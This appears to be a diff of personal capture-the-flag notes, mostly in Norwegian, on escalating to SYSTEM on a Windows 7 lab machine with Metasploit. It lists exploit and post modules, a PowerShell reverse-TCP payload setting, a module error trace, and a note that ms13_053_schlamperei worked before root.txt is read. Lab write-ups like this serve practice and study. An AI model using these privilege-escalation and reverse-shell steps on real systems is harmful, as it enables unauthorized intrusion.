@@ -67,7 +67,7 @@ net users
 
     **
 
-use post/multi/recon/local\_exploit\_suggester **            
+use post/multi/recon/local\_exploit\_suggester **              
 **FORSØKT ALLE DISSE UTEN HELL\*\*
 
 ```
@@ -113,8 +113,8 @@ msf post\(enum\_patches\) &gt; set session 2
 session =&gt; 2  
 msf post\(enum\_patches\) &gt; exploit
 
-\[-\] Post failed: NoMethodError undefined method `[]' for nil:NilClass            
-[-] Call stack:            
+\[-\] Post failed: NoMethodError undefined method `[]' for nil:NilClass              
+[-] Call stack:              
 [-]   /usr/share/metasploit-framework/modules/post/windows/gather/enum_patches.rb:72:in`run'  
 \[\*\] Post module execution completed
 
@@ -139,13 +139,16 @@ use exploit/windows/local/payload_inject
 set payload windows/powershell_reverse_tcp
 
 exploit/windows/local/ms16_032_secondary_logon_handle_privesc funekr ikke fordi det bare er et ettkjerne vm. krever to kjerner
-```
+
+
 
 ```
-use exploit/windows/local/ms13\_053\_schlamperei
-tror det var denne som ordnet det. kjørte getsystem of fikk SYSTEM
-det var riktig ja
-```
+
+
+
+**exploit/windows/local/ms13\\_053\\_schlamperei denne virker på 7 sp1 x86**
+
+
 
 type root.txt.txt
 
